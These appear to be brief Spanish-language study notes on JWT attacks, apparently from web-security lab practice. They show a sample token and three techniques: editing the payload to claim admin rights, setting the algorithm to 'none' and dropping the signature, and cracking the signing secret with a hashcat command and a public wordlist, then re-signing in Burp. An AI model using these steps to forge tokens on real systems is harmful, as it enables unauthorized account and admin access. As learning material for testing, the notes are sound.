JWT
Primera Parte: Header
Segunda Parte: Payload
Tercera Parte: Signature

```jwt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```


JWT vs JWS vs JWE

### Accepting arbitrary signatures

Cambiar el contenido de Payload

{
  "admin": true
}

### Accepting tokens with no signature

Cambiar alg a none.

{
  "alg": "none"
}

Y quitar la signature pero dejar un punto.

```jwt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
```

### Cracking Signature

```
echo "eyJraWQiOiJhMDVjZjRkMC04ZTZjLTRkMDAtOTdmOC0zM2ZjNDZkNDQzZjQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NTczMjcyN30.auoa8D3X58ZallUssp9Np993mQGcq5qwhbaNtJRIx7U" > hashjwt

hashcat -a 0 -m 16500 hashjwt jwt.secrets.list
```

To use signature key in burp:
Repeater > JSON Web Tokens > Recalculate Signature ( Press ) > Secret / Key ( Type Key )

https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list

